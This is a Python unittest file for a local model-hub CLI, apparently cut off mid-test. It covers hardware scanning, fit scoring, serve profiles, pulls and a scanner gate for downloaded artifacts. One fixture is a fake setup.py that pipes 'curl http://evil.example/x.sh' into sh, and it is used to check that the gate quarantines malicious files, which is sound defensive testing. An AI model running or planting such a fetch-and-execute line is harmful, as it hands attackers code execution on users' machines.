#!/usr/bin/env python3
"""test_modelhub.py — exercise modelhub.py's verbs end to end.

Runs each verb as a SUBPROCESS, asserts stdout is EXACTLY ONE JSON object carrying the
contract keys. Stdlib unittest only; no third-party deps.
"""
from __future__ import annotations

import json
import re
import subprocess
import sys
import unittest
from pathlib import Path

HERE = Path(__file__).resolve().parent
MODELHUB = HERE / "modelhub.py"


def run_verb(*args: str) -> tuple[dict, str, int]:
    proc = subprocess.run(
        [sys.executable, str(MODELHUB), *args],
        capture_output=True, text=True, timeout=120,
    )
    out = proc.stdout.strip()
    lines = [ln for ln in out.splitlines() if ln.strip()]
    assert len(lines) == 1, f"expected ONE stdout line, got {len(lines)}: {out!r}"
    return json.loads(lines[0]), proc.stderr, proc.returncode


class ModelhubTests(unittest.TestCase):
    def _assert_envelope(self, obj: dict, command: str) -> None:
        self.assertIn("ok", obj)
        self.assertEqual(obj["command"], command)
        self.assertTrue(obj["ok"], msg=f"verb failed: {obj.get('error')}")

    def test_hw_scan(self) -> None:
        obj, _stderr, code = run_verb("hw.scan")
        self._assert_envelope(obj, "hw.scan")
        self.assertEqual(code, 0)
        for k in ("os", "arch", "cpu", "ram_bytes", "gpus", "gpu_count",
                  "unified_memory", "usable_weight_bytes", "usable_basis"):
            self.assertIn(k, obj)
        self.assertIsInstance(obj["gpus"], list)
        self.assertEqual(obj["gpu_count"], len(obj["gpus"]))
        # this dev host has real RAM; usable memory must resolve
        self.assertIsNotNone(obj["ram_bytes"])
        self.assertIsNotNone(obj["usable_weight_bytes"])
        self.assertGreater(obj["usable_weight_bytes"], 0)

    def test_model_list_empty_dir(self) -> None:
        # point at a dir that has no model files; must still emit a valid object
        obj, _stderr, code = run_verb("model.list", str(HERE))
        self._assert_envelope(obj, "model.list")
        self.assertEqual(code, 0)
        self.assertIn("models", obj)
        self.assertIsInstance(obj["models"], list)
        self.assertEqual(obj["count"], len(obj["models"]))
        self.assertTrue(obj["exists"])

    def test_fit_score_small_model_fits(self) -> None:
        obj, _stderr, code = run_verb("fit.score", "--params", "7b", "--quant", "q4_k_m")
        self._assert_envelope(obj, "fit.score")
        self.assertEqual(code, 0)
        self.assertIn(obj["verdict"], ("fits", "tight", "no"))
        for k in ("recommended_quant", "weight_bytes", "needed_bytes",
                  "usable_bytes", "headroom_ratio", "hw_basis"):
            self.assertIn(k, obj)
        # a 7B q4 model fits on a 64GB unified-memory host
        self.assertEqual(obj["verdict"], "fits")

    def test_fit_score_with_provided_hw(self) -> None:
        # feed a tiny hw object → a 70B model must NOT fit
        hw = json.dumps({"usable_weight_bytes": 4 * 1024**3})  # 4 GiB usable
        obj, _stderr, code = run_verb("fit.score", "--params", "70b", "--quant", "q4_k_m", "--hw", hw)
        self._assert_envelope(obj, "fit.score")
        self.assertEqual(obj["hw_basis"], "provided")
        self.assertEqual(obj["verdict"], "no")

    def test_fit_score_requires_size_or_params(self) -> None:
        obj, _stderr, code = run_verb("fit.score")
        self.assertFalse(obj["ok"])
        self.assertEqual(code, 2)
        self.assertIn("error", obj)

    def test_model_search_all(self) -> None:
        obj, _stderr, code = run_verb("model.search")
        self._assert_envelope(obj, "model.search")
        self.assertEqual(code, 0)
        self.assertGreater(obj["count"], 0)
        self.assertEqual(obj["count"], len(obj["results"]))
        ids = {m["id"] for m in obj["results"]}
        # spot-check the required families are present
        self.assertTrue(any("qwen3" in i for i in ids))
        self.assertTrue(any("gpt-oss" in i for i in ids))
        self.assertTrue(any("gemma3" in i for i in ids))

    def test_model_search_query(self) -> None:
        obj, _stderr, code = run_verb("model.search", "llama")
        self._assert_envelope(obj, "model.search")
        self.assertEqual(code, 0)
        for m in obj["results"]:
            hay = json.dumps(m).lower()
            self.assertIn("llama", hay)

    def test_model_search_kind_filter(self) -> None:
        obj, _stderr, code = run_verb("model.search", "--kind", "non-llm")
        self._assert_envelope(obj, "model.search")
        self.assertEqual(code, 0)
        for m in obj["results"]:
            self.assertEqual(m["kind"], "non-llm")

    def test_model_search_source_ollama_lists_pullable(self) -> None:
        # regression: `--source ollama` used to leak "ollama" into the query → 0 rows.
        obj, _stderr, code = run_verb("model.search", "--source", "ollama")
        self._assert_envelope(obj, "model.search")
        self.assertEqual(code, 0)
        self.assertGreater(len(obj["results"]), 20)
        for m in obj["results"]:
            self.assertTrue(m.get("ollama"), msg=f"{m['id']} lacks an ollama tag")

    def test_model_search_source_and_query_combine(self) -> None:
        obj, _stderr, code = run_verb("model.search", "llama", "--source", "ollama")
        self.assertEqual(code, 0)
        for m in obj["results"]:
            self.assertTrue(m.get("ollama"))
            self.assertIn("llama", json.dumps(m).lower())

    def test_unknown_verb_fails_closed(self) -> None:
        obj, _stderr, code = run_verb("nope.nope")
        self.assertFalse(obj["ok"])
        self.assertEqual(code, 2)


# --------------------------------------------------------------------------- #
# file 05 §3 — the NEW verb surface (subprocess contract: ONE JSON object).
# --------------------------------------------------------------------------- #

class NewVerbContractTests(unittest.TestCase):
    """fit / download / serve / endpoints / repoint each emit a valid envelope."""

    def test_fit_by_catalog_id_ranks_quants_with_reasons(self) -> None:
        obj, _stderr, code = run_verb("fit", "--id", "qwen3-8b", "--ctx", "8192")
        self.assertEqual(obj["command"], "fit")
        self.assertTrue(obj["ok"], msg=obj.get("error"))
        self.assertEqual(code, 0)
        self.assertEqual(obj["params_b"], 8.0)
        self.assertIsInstance(obj["ranked"], list)
        self.assertGreater(len(obj["ranked"]), 0)
        self.assertIsInstance(obj["reasons"], list)
        self.assertGreater(len(obj["reasons"]), 0)
        for q in obj["ranked"]:
            self.assertIn(q["verdict"], ("FITS", "TIGHT", "PARTIAL", "OVERFLOW"))
            self.assertIn(q["fmt"], ("gguf", "safetensors", "awq", "gptq", "fp8", "mlx"))
        # an 8B model fits comfortably on this 64GB unified host → a recommendation exists
        self.assertIsNotNone(obj["recommended"])

    def test_fit_unknown_id_fails(self) -> None:
        obj, _stderr, code = run_verb("fit", "--id", "no-such-model-xyz")
        self.assertFalse(obj["ok"])
        self.assertEqual(code, 2)

    def test_fit_with_tiny_provided_hw_overflows(self) -> None:
        hw = json.dumps({"accel": "cpu", "usable_gb": 2.0,
                         "caps": {"accel": "cpu"}})
        obj, _stderr, code = run_verb("fit", "--id", "llama3.3-70b", "--hw", hw)
        self.assertTrue(obj["ok"])
        # nothing fits a 2GB budget → no recommendation, OVERFLOW escape hatch reason
        self.assertIsNone(obj["recommended"])
        self.assertTrue(any("OVERFLOW" in r for r in obj["reasons"]))

    def test_download_without_staged_is_a_plan(self) -> None:
        obj, _stderr, code = run_verb("download", "--id", "qwen3-8b", "--quant", "q4_k_m")
        self.assertEqual(obj["command"], "download")
        self.assertTrue(obj.get("planned"))
        self.assertEqual(code, 0)
        for k in ("fetch", "gate", "admit"):
            self.assertIn(k, obj["plan"])
        self.assertIn("stage_dir", obj)

    def test_serve_builds_profile_and_argv(self) -> None:
        obj, _stderr, code = run_verb(
            "serve", "--id", "qwen3-8b", "--quant", "q4_k_m",
            "--runner", "llamacpp", "--ctx", "8192")
        self.assertEqual(obj["command"], "serve")
        self.assertTrue(obj["ok"], msg=obj.get("error"))
        self.assertEqual(code, 0)
        p = obj["profile"]
        self.assertEqual(p["runner"], "llamacpp")
        self.assertEqual(p["api_key"], "local")
        self.assertTrue(p["endpoint"]["base_url"].endswith("/v1"))
        self.assertIn("llama-server", p["argv"])
        self.assertIn("-ngl", p["argv"])

    def test_serve_unknown_runner_fails(self) -> None:
        obj, _stderr, code = run_verb("serve", "--id", "qwen3-8b", "--runner", "bogus")
        self.assertFalse(obj["ok"])
        self.assertEqual(code, 2)

    def test_endpoints_live_passthrough(self) -> None:
        # LIVE: really runs prometheus.py localai endpoints (no network).
        obj, _stderr, code = run_verb("endpoints")
        self.assertEqual(obj["command"], "endpoints")
        self.assertTrue(obj["ok"], msg=obj.get("error"))
        self.assertEqual(code, 0)
        self.assertIsInstance(obj["local"], list)
        self.assertIsInstance(obj["open_api"], list)
        # the engine always lists local OpenAI-compatible servers (ollama/llamacpp/vllm)
        names = {e["name"] for e in obj["local"]}
        self.assertTrue({"ollama", "llamacpp", "vllm"} & names)

    def test_repoint_live_proposes_non_secret_env(self) -> None:
        obj, _stderr, code = run_verb(
            "repoint", "--tool", "pentestgpt", "--base-url", "http://127.0.0.1:8080/v1")
        self.assertEqual(obj["command"], "repoint")
        self.assertTrue(obj["ok"], msg=obj.get("error"))
        self.assertEqual(code, 0)
        # never proposes a real key — only the dummy placeholder
        for var, val in obj["proposed_env"].items():
            if "KEY" in var:
                self.assertEqual(val, "ollama")
            else:
                self.assertEqual(val, "http://127.0.0.1:8080/v1")

    def test_repoint_requires_args(self) -> None:
        obj, _stderr, code = run_verb("repoint", "--tool", "pentestgpt")
        self.assertFalse(obj["ok"])
        self.assertEqual(code, 2)


# --------------------------------------------------------------------------- #
# file 05 §4 — the fit-scoring MATH (pure, offline, deterministic).
# --------------------------------------------------------------------------- #
import os  # noqa: E402

sys.path.insert(0, str(HERE))
import fit as fitmod  # noqa: E402
import serve as servemod  # noqa: E402
import nemesis_gate  # noqa: E402


class FitMathTests(unittest.TestCase):
    def test_weights_gb_scales_with_params_and_bits(self) -> None:
        # 7B q4_k_m ≈ 7 * 4.85/8 ≈ 4.24 GiB
        self.assertAlmostEqual(fitmod.weights_gb(7.0, "q4_k_m"), 7e9 * (4.85 / 8) / 1024**3, places=3)
        # higher bits ⇒ bigger
        self.assertGreater(fitmod.weights_gb(7.0, "q8_0"), fitmod.weights_gb(7.0, "q4_k_m"))

    def test_verdict_thresholds(self) -> None:
        self.assertEqual(fitmod.verdict_for_ratio(0.5), "FITS")
        self.assertEqual(fitmod.verdict_for_ratio(0.9), "TIGHT")
        self.assertEqual(fitmod.verdict_for_ratio(1.3), "PARTIAL")
        self.assertEqual(fitmod.verdict_for_ratio(2.0), "OVERFLOW")

    def test_score_quant_fits_on_big_budget(self) -> None:
        s = fitmod.score_quant("q4_k_m", params_b=8.0, usable_gb=64.0, ctx_len=4096,
                               family="qwen3", caps={"accel": "metal", "metal": True})
        self.assertEqual(s["verdict"], "FITS")
        self.assertTrue(s["runnable"])
        self.assertEqual(s["fmt"], "gguf")

    def test_score_quant_overflows_on_tiny_budget(self) -> None:
        s = fitmod.score_quant("q4_k_m", params_b=70.0, usable_gb=4.0, ctx_len=4096,
                               family="llama3", caps={"accel": "cpu"})
        self.assertEqual(s["verdict"], "OVERFLOW")

    def test_fp8_gated_without_caps(self) -> None:
        s = fitmod.score_quant("fp8", params_b=8.0, usable_gb=24.0,
                               caps={"accel": "cuda", "fp8": False})
        self.assertFalse(s["runnable"])
        self.assertIn("FP8", s["blocked_reason"])

    def test_fp8_runnable_with_caps(self) -> None:
        s = fitmod.score_quant("fp8", params_b=8.0, usable_gb=24.0,
                               caps={"accel": "cuda", "fp8": True})
        self.assertTrue(s["runnable"])

    def test_metal_cannot_run_safetensors_awq(self) -> None:
        s = fitmod.score_quant("awq-4bit", params_b=8.0, usable_gb=36.0,
                               caps={"accel": "metal", "metal": True})
        self.assertFalse(s["runnable"])

    def test_recommend_picks_highest_quality_that_fits(self) -> None:
        rec = fitmod.recommend(params_b=8.0, usable_gb=64.0, ctx_len=4096,
                               family="qwen3", caps={"accel": "metal", "metal": True})
        self.assertIsNotNone(rec["recommended"])
        # on a 64GB budget the best quality that fits is q8_0
        self.assertEqual(rec["recommended"]["label"], "q8_0")
        self.assertTrue(rec["reasons"])

    def test_recommend_none_when_nothing_fits(self) -> None:
        rec = fitmod.recommend(params_b=120.0, usable_gb=3.0, ctx_len=4096,
                               family="gpt-oss", caps={"accel": "cpu"})
        self.assertIsNone(rec["recommended"])
        self.assertTrue(any("OVERFLOW" in r for r in rec["reasons"]))

    def test_recommend_respects_candidate_quants(self) -> None:
        rec = fitmod.recommend(params_b=8.0, usable_gb=64.0, ctx_len=4096,
                               family="qwen3", candidate_quants=["q4_k_m"],
                               caps={"accel": "metal"})
        labels = {r["label"] for r in rec["ranked"]}
        self.assertEqual(labels, {"q4_k_m"})


# --------------------------------------------------------------------------- #
# file 05 §8 — ServeProfile + runner-argv CONSTRUCTION (pure, no spawn).
# --------------------------------------------------------------------------- #

class ServeArgvTests(unittest.TestCase):
    def test_llamacpp_full_offload_when_fits(self) -> None:
        fit = {"verdict": "FITS", "ratio": 0.3, "fmt": "gguf"}
        p = servemod.build_serve_profile(
            model_id="qwen3-8b", quant="q4_k_m", runner="llamacpp", fit=fit,
            gguf_path="/m/x.gguf", ctx_len=8192, n_layers=36, gpu_count=1,
            caps={"accel": "metal"})
        self.assertEqual(p["args"]["gpu_layers"], 36)  # all layers on GPU
        self.assertIn("-ngl", p["argv"])
        self.assertIn("36", p["argv"])
        self.assertEqual(p["endpoint"]["base_url"], "http://127.0.0.1:8080/v1")

    def test_llamacpp_partial_offload(self) -> None:
        fit = {"verdict": "PARTIAL", "ratio": 1.25, "fmt": "gguf"}
        p = servemod.build_serve_profile(
            model_id="llama3.3-70b", quant="q4_k_m", runner="llamacpp", fit=fit,
            ctx_len=4096, n_layers=80, gpu_count=1)
        # PARTIAL ⇒ offload a fraction (1/1.25 = 0.8 → 64 layers)
        self.assertLess(p["args"]["gpu_layers"], 80)
        self.assertGreater(p["args"]["gpu_layers"], 0)

    def test_vllm_tensor_parallel_across_gpus_on_overflow(self) -> None:
        fit = {"verdict": "OVERFLOW", "ratio": 2.0, "fmt": "awq"}
        p = servemod.build_serve_profile(
            model_id="llama3.3-70b", quant="awq-4bit", runner="vllm", fit=fit,
            hf_id="meta-llama/Llama-3.3-70B-Instruct", ctx_len=8192,
            gpu_count=4, caps={"accel": "cuda", "fp8": True})
        self.assertEqual(p["args"]["tensor_parallel"], 4)
        self.assertIn("--tensor-parallel-size", p["argv"])
        self.assertIn("4", p["argv"])
        self.assertIn("--quantization", p["argv"])
        self.assertIn("--kv-cache-dtype", p["argv"])  # fp8 cap → fp8 kv cache

    def test_ollama_records_pull(self) -> None:
        fit = {"verdict": "FITS", "ratio": 0.2, "fmt": "gguf"}
        p = servemod.build_serve_profile(
            model_id="qwen3:8b", quant="q4_k_m", runner="ollama", fit=fit)
        self.assertEqual(p["argv"][:2], ["ollama", "pull"])
        self.assertEqual(p["endpoint"]["port"], 11434)


# --------------------------------------------------------------------------- #
# file 05 §5 — the SECURITY SPINE: stage → REAL nemesis → admit | quarantine.
# Drives the real scanner on LOCAL planted dirs (no network, no downloads).
# --------------------------------------------------------------------------- #
import tempfile  # noqa: E402

_BENIGN_GGUF = "this is gguf weight data, not python code\n"
_MALICIOUS = 'import os\nos.system("curl http://evil.example/x.sh | sh")\n'


class GateSpineTests(unittest.TestCase):
    def setUp(self) -> None:
        self.lib = tempfile.mkdtemp(prefix="mh-lib-")
        os.environ["PROMETHEUS_MODELS_HOME"] = self.lib

    def tearDown(self) -> None:
        import shutil
        shutil.rmtree(self.lib, ignore_errors=True)
        os.environ.pop("PROMETHEUS_MODELS_HOME", None)

    def _stage(self, files: dict) -> Path:
        d = Path(tempfile.mkdtemp(prefix="mh-stage-"))
        for name, body in files.items():
            (d / name).write_text(body, encoding="utf-8")
        return d

    def test_benign_artifact_is_admitted(self) -> None:
        stg = self._stage({"model.gguf": _BENIGN_GGUF})
        r = nemesis_gate.admit("test/clean", staging=stg, quant="q4_k_m")
        self.assertTrue(r["admitted"])
        self.assertEqual(r["verdict"], "allow")
        # moved into the live library + a manifest written
        live = Path(r["local_path"])
        self.assertTrue((live / "model.gguf").exists())
        self.assertTrue((live / ".prometheus_model.json").exists())

    def test_malicious_artifact_is_blocked_and_quarantined(self) -> None:
        stg = self._stage({"setup.py": _MALICIOUS})
        r = nemesis_gate.admit("test/evil", staging=stg)
        self.assertFalse(r["admitted"])
        self.assertTrue(r["blocked"])
        self.assertEqual(r["gate"]["verdict"], "block")
        # the staged bytes are quarantined for inspection, NOT auto-deleted
        self.assertIn("quarantined", r)
        self.assertTrue(Path(r["quarantined"]).exists())
        self.assertFalse(stg.exists())  # moved aside

    def test_pickle_format_flagged_high_risk(self) -> None:
        stg = self._stage({"pytorch_model.bin": "fake", "model.safetensors": "safe"})
        r = nemesis_gate.admit("test/pickle", staging=stg, force=False)
        self.assertEqual(r["format_risk"]["risk"], "high")
        self.assertIn("pytorch_model.bin", r["format_risk"]["high_risk_files"])
        self.assertIn("model.safetensors", r["format_risk"]["safe_files"])

    def test_sha256_mismatch_blocks_before_admit(self) -> None:
        stg = self._stage({"w.gguf": "abc"})
        r = nemesis_gate.admit("test/badsha", staging=stg,
                               expected_sha256={"w.gguf": "deadbeef" * 8})
        self.assertFalse(r["admitted"])
        self.assertTrue(r["blocked"])
        self.assertFalse(r["checksum"]["ok"])
        self.assertEqual(len(r["checksum"]["mismatches"]), 1)

    def test_sha256_match_allows_admit(self) -> None:
        stg = self._stage({"w.gguf": "abc"})
        good = nemesis_gate.sha256_file(stg / "w.gguf")
        r = nemesis_gate.admit("test/goodsha", staging=stg,
                               expected_sha256={"w.gguf": good})
        self.assertTrue(r["checksum"]["ok"])
        self.assertTrue(r["admitted"])

    def test_force_overrides_block_and_flags_forced_danger(self) -> None:
        stg = self._stage({"setup.py": _MALICIOUS})
        r = nemesis_gate.admit("test/forced", staging=stg, force=True)
        self.assertTrue(r["admitted"])
        self.assertIn("forced_danger", r)
        self.assertEqual(r["forced_danger"]["verdict"], "block")

    def test_failclosed_when_scanner_missing(self) -> None:
        stg = self._stage({"w.gguf": "abc"})
        original = nemesis_gate.find_nemesis
        try:
            nemesis_gate.find_nemesis = lambda: None  # type: ignore[assignment]
            r = nemesis_gate.admit("test/fc", staging=stg)
        finally:
            nemesis_gate.find_nemesis = original  # type: ignore[assignment]
        self.assertFalse(r["admitted"])
        self.assertTrue(r["blocked"])
        self.assertEqual(r["verdict"], "error")
        self.assertIn("quarantined", r)

    def test_failclosed_on_missing_stage_dir(self) -> None:
        r = nemesis_gate.admit("test/nostage",
                               staging=Path("/tmp/__definitely_not_here_modelhub__"))
        self.assertFalse(r["admitted"])
        self.assertTrue(r["blocked"])

    def test_nemesis_gate_returns_error_on_missing_target(self) -> None:
        v = nemesis_gate.nemesis_gate("/tmp/__no_such_target_modelhub_xyz__")
        self.assertEqual(v["verdict"], "error")


class RemoveUnserveAliasTests(unittest.TestCase):
    """file 05 §3 verbs added after the first pass: remove, unserve + the
    hardware/search/info/library spec-name aliases (the TS client calls these)."""

    def _run_env(self, env_extra: dict, *args: str) -> tuple[dict, int]:
        import os as _os

        proc = subprocess.run(
            [sys.executable, str(MODELHUB), *args],
            capture_output=True, text=True, timeout=120,
            env={**_os.environ, **env_extra},
        )
        line = [ln for ln in proc.stdout.strip().splitlines() if ln.strip()][-1]
        return json.loads(line), proc.returncode

    def test_search_matches_description_and_license_filter(self) -> None:
        # Mine a distinctive word that appears ONLY in a real row's description (not in its
        # id/name/family/tags) and assert that searching it hits the row (CLI-025).
        catalog = json.loads((HERE.parents[1] / "config" / "open-models.json").read_text())
        probe = None
        for m in catalog.get("models", []):
            desc = str(m.get("description", "")).lower()
            other = " ".join([
                str(m.get("id", "")), str(m.get("name", "")), str(m.get("family", "")),
                " ".join(m.get("tags", [])),
            ]).lower()
            for word in re.findall(r"[a-z]{5,}", desc):
                if word not in other:
                    probe = (m.get("id"), word)
                    break
            if probe:
                break
        self.assertIsNotNone(probe, "expected at least one description-only word in the catalog")
        model_id, word = probe
        obj, _s, code = run_verb("model.search", word)
        self.assertEqual(code, 0)
        self.assertIn(model_id, [r.get("id") for r in obj["results"]])
        # --license substring filter keeps only matching rows (case-insensitive).
        lic, _s2, code2 = run_verb("model.search", "--license", "apache")
        self.assertEqual(code2, 0)
        for row in lic["results"]:
            self.assertIn("apache", str(row.get("license", "")).lower())

    def test_aliases_resolve(self) -> None:
        for verb in ("hardware", "search", "info", "library"):
            obj, _s, code = run_verb(verb)
            self.assertEqual(code, 0, msg=f"alias {verb} failed: {obj.get('error')}")
            self.assertTrue(obj["ok"], msg=f"alias {verb} not ok")

    def test_unserve_idempotent_when_no_profiles(self) -> None:
        import tempfile

        with tempfile.TemporaryDirectory() as d:
            obj, code = self._run_env({"PROMETHEUS_MODELS_DIR": d}, "unserve", "--profile", "ghost")
            self.assertEqual(code, 0)
            self.assertTrue(obj["ok"] and obj["stopped"])
            self.assertFalse(obj["found"])

    def test_remove_unknown_id_exits_2_not_found(self) -> None:
        import tempfile

        with tempfile.TemporaryDirectory() as d:
            obj, code = self._run_env({"PROMETHEUS_MODELS_DIR": d}, "remove", "--id", "acme/none")
            # unknown id is an honest exit-2 error, NOT a silent ok:true/0 (CLI-023)
            self.assertEqual(code, 2)
            self.assertFalse(obj["ok"])
            self.assertTrue(obj["not_found"])
            self.assertEqual(obj["freed_bytes"], 0)

    def test_prune_dry_run_lists_but_deletes_nothing(self) -> None:
        import tempfile

        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            blobs = root / "blobs"
            blobs.mkdir(parents=True)
            manifests = root / "manifests" / "registry" / "acme" / "demo"
            manifests.mkdir(parents=True)
            # one referenced blob + two dangling
            ref = blobs / "sha256-aaaa1111"
            ref.write_bytes(b"\x00" * 100)
            d1 = blobs / "sha256-bbbb2222"
            d1.write_bytes(b"\x00" * 200)
            d2 = blobs / "sha256-cccc3333"
            d2.write_bytes(b"\x00" * 300)
            (manifests / "latest").write_text(
                json.dumps({"layers": [{"digest": "sha256:aaaa1111"}]})
            )
            obj, code = self._run_env({"PROMETHEUS_MODELS_DIR": d}, "prune", "--dry-run")
            self.assertEqual(code, 0)
            self.assertTrue(obj["ok"] and obj["dry_run"])
            self.assertEqual(obj["removed_count"], 2)
            self.assertEqual(obj["freed_bytes"], 500)  # 200 + 300
            self.assertEqual(obj["removed"], [])  # dry-run deletes nothing
            # all three still on disk
            self.assertTrue(ref.exists() and d1.exists() and d2.exists())

    def test_prune_removes_exactly_the_dangling_blobs(self) -> None:
        import tempfile

        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            blobs = root / "blobs"
            blobs.mkdir(parents=True)
            manifests = root / "manifests"
            manifests.mkdir(parents=True)
            ref = blobs / "sha256-deadbeef"
            ref.write_bytes(b"\x00" * 100)
            d1 = blobs / "sha256-11112222"
            d1.write_bytes(b"\x00" * 200)
            d2 = blobs / "sha256-33334444"
            d2.write_bytes(b"\x00" * 300)
            (manifests / "m1.json").write_text(json.dumps({"config": {"digest": "sha256:deadbeef"}}))
            obj, code = self._run_env({"PROMETHEUS_MODELS_DIR": d}, "prune")
            self.assertEqual(code, 0)
            self.assertEqual(obj["removed_count"], 2)
            self.assertEqual(obj["freed_bytes"], 500)
            # referenced kept, dangling gone
            self.assertTrue(ref.exists())
            self.assertFalse(d1.exists())
            self.assertFalse(d2.exists())

    def test_prune_never_touches_a_shared_blob(self) -> None:
        import tempfile

        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            blobs = root / "blobs"
            blobs.mkdir(parents=True)
            manifests = root / "manifests"
            manifests.mkdir(parents=True)
            shared = blobs / "sha256-5555aaaa"
            shared.write_bytes(b"\x00" * 100)
            # two manifests both point at the shared blob → reference-counted, kept
            (manifests / "a.json").write_text(json.dumps({"layers": [{"digest": "sha256:5555aaaa"}]}))
            (manifests / "b.json").write_text(json.dumps({"layers": [{"digest": "sha256:5555aaaa"}]}))
            obj, code = self._run_env({"PROMETHEUS_MODELS_DIR": d}, "prune")
            self.assertEqual(code, 0)
            self.assertEqual(obj["removed_count"], 0)
            self.assertTrue(shared.exists())

    def test_remove_refuses_when_serve_profile_references_it(self) -> None:
        import tempfile

        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            # a model file + a serve profile that references the model
            mdir = root / "huggingface" / "acme__demo-GGUF"
            mdir.mkdir(parents=True)
            (mdir / "demo-Q4_K_M.gguf").write_bytes(b"\x00" * 2048)
            (root / "serve-profiles.json").write_text(
                json.dumps([{"id": "p1", "model_id": "acme/demo-GGUF", "status": "ready"}])
            )
            refused, code = self._run_env(
                {"PROMETHEUS_MODELS_DIR": d}, "remove", "--id", "acme/demo-GGUF"
            )
            self.assertFalse(refused["ok"])
            self.assertTrue(refused.get("refused"))
            self.assertIn("p1", refused.get("referenced_by", []))
            # still on disk
            self.assertTrue((mdir / "demo-Q4_K_M.gguf").exists())
            # --force actually deletes it and reports freed bytes
            forced, code2 = self._run_env(
                {"PROMETHEUS_MODELS_DIR": d}, "remove", "--id", "acme/demo-GGUF", "--force"
            )
            self.assertTrue(forced["ok"])
            self.assertGreater(forced["freed_bytes"], 0)
            self.assertFalse((mdir / "demo-Q4_K_M.gguf").exists())


# --------------------------------------------------------------------------- #
# §5 — the REAL local-model pull via ollama (env-stubbed: no ollama, no network)
# --------------------------------------------------------------------------- #

def run_verb_env(env_extra: dict, *args: str) -> tuple[dict, str, int]:
    import os

    env = dict(os.environ)
    env.update(env_extra)
    proc = subprocess.run(
        [sys.executable, str(MODELHUB), *args],
        capture_output=True, text=True, timeout=120, env=env,
    )
    out = proc.stdout.strip()
    lines = [ln for ln in out.splitlines() if ln.strip()]
    assert len(lines) == 1, f"expected ONE stdout line, got {len(lines)}: {out!r}"
    return json.loads(lines[0]), proc.stderr, proc.returncode


class PullTests(unittest.TestCase):
    """`pull` runs a REAL ollama download on a user machine; here the subprocess seam is
    env-stubbed so the dispatch / progress / envelope contract is exercised hermetically."""

    def test_pull_needs_id(self) -> None:
        obj, _stderr, code = run_verb("pull")
        self.assertFalse(obj["ok"])
        self.assertEqual(code, 2)

    def test_pull_missing_runner_is_actionable(self) -> None:
        obj, _stderr, code = run_verb_env(
            {"MODELHUB_FORCE_NO_OLLAMA": "1"}, "pull", "--id", "demo", "--tag", "qwen2.5:3b"
        )
        self.assertEqual(obj["command"], "pull")
        self.assertFalse(obj["ok"])
        self.assertEqual(code, 2)
        self.assertTrue(obj["installable"])
        self.assertEqual(obj["runner"], "ollama")
        self.assertIn("install", obj)

    def test_pull_success_streams_progress(self) -> None:
        obj, stderr, code = run_verb_env(
            {
                "MODELHUB_FAKE_OLLAMA": "1",
                "MODELHUB_FAKE_PULL_LINES": "pulling manifest\npulling 42%\npulling 100%\nsuccess",
                "MODELHUB_FAKE_PULL_CODE": "0",
            },
            "pull", "--id", "demo", "--tag", "qwen2.5:3b",
        )
        self.assertTrue(obj["ok"], msg=obj.get("error"))
        self.assertEqual(code, 0)
        self.assertTrue(obj["installed"])
        self.assertEqual(obj["runner"], "ollama")
        self.assertEqual(obj["tag"], "qwen2.5:3b")
        self.assertIn("11434", obj["endpoint"])
        # progress went to stderr as JSON-lines and reached 100
        prog = [json.loads(ln) for ln in stderr.splitlines() if ln.strip().startswith("{")]
        self.assertTrue(prog, msg="expected progress JSON-lines on stderr")
        self.assertEqual(max(p["pct"] for p in prog), 100)

    def test_pull_failure_surfaces_exit_code(self) -> None:
        obj, _stderr, code = run_verb_env(
            {
                "MODELHUB_FAKE_OLLAMA": "1",
                "MODELHUB_FAKE_PULL_LINES": "error: manifest not found",
                "MODELHUB_FAKE_PULL_CODE": "1",
            },
            "pull", "--id", "demo", "--tag", "nope:latest",
        )
        self.assertFalse(obj["ok"])
        self.assertEqual(code, 2)
        self.assertIn("exited 1", obj["error"])

    def test_pull_fails_when_daemon_down(self) -> None:
        # ollama CLI present but the daemon is unreachable + un-startable → the pull
        # fails BEFORE `ollama pull` with an actionable "start the service" message
        # (the `brew install ollama` CLI-only case, without which pull exits 1).
        obj, _stderr, code = run_verb_env(
            {"MODELHUB_FAKE_OLLAMA": "1", "MODELHUB_FORCE_DAEMON_DOWN": "1"},
            "pull", "--id", "demo", "--tag", "qwen2.5:3b",
        )
        self.assertEqual(obj["command"], "pull")
        self.assertFalse(obj["ok"])
        self.assertEqual(code, 2)
        self.assertIn("service", obj["error"])
        self.assertIn("ollama serve", obj["hint"])


# --------------------------------------------------------------------------- #
# auto-install the runner ON THE USER'S BEHALF (OS-aware, env-stubbed)
# --------------------------------------------------------------------------- #

class InstallRunnerTests(unittest.TestCase):
    """`install-runner` runs the OS-appropriate ollama installer itself (no copy-paste).
    The subprocess + OS + brew are env-stubbed so command SELECTION is exercised
    hermetically (no brew run, no curl|sh, no network)."""

    def test_already_installed_is_idempotent(self) -> None:
        obj, _stderr, code = run_verb_env({"MODELHUB_FAKE_OLLAMA": "1"}, "install-runner")
        self.assertEqual(obj["command"], "install-runner")
        self.assertTrue(obj["ok"])
        self.assertEqual(code, 0)
        self.assertTrue(obj["installed"])

    def test_rejects_unknown_runner(self) -> None:
        obj, _stderr, code = run_verb_env(
            {"MODELHUB_FORCE_NO_OLLAMA": "1"}, "install-runner", "--runner", "vllm"
        )
        self.assertFalse(obj["ok"])
        self.assertEqual(code, 2)

    def test_macos_without_brew_is_manual(self) -> None:
        obj, _stderr, code = run_verb_env(
            {
                "MODELHUB_FORCE_OS": "macos",
                "MODELHUB_FORCE_NO_BREW": "1",
                "MODELHUB_FORCE_NO_OLLAMA": "1",
            },
            "install-runner",
        )
        self.assertFalse(obj["ok"])
        self.assertEqual(code, 2)
        self.assertTrue(obj["manual"])
        self.assertEqual(obj["os"], "macos")
        self.assertIn("ollama.com", obj["url"])

    def test_windows_is_manual(self) -> None:
        obj, _stderr, code = run_verb_env(
            {"MODELHUB_FORCE_OS": "windows", "MODELHUB_FORCE_NO_OLLAMA": "1"},
            "install-runner",
        )
        self.assertFalse(obj["ok"])
        self.assertTrue(obj["manual"])
        self.assertEqual(obj["os"], "windows")

    def test_linux_runs_installer_and_streams(self) -> None:
        obj, stderr, code = run_verb_env(
            {
                "MODELHUB_FORCE_OS": "linux",
                "MODELHUB_FORCE_NO_OLLAMA": "1",
                "MODELHUB_FAKE_INSTALL_LINES": ">>> downloading ollama\n>>> installing to /usr/local/bin",
                "MODELHUB_FAKE_INSTALL_CODE": "0",
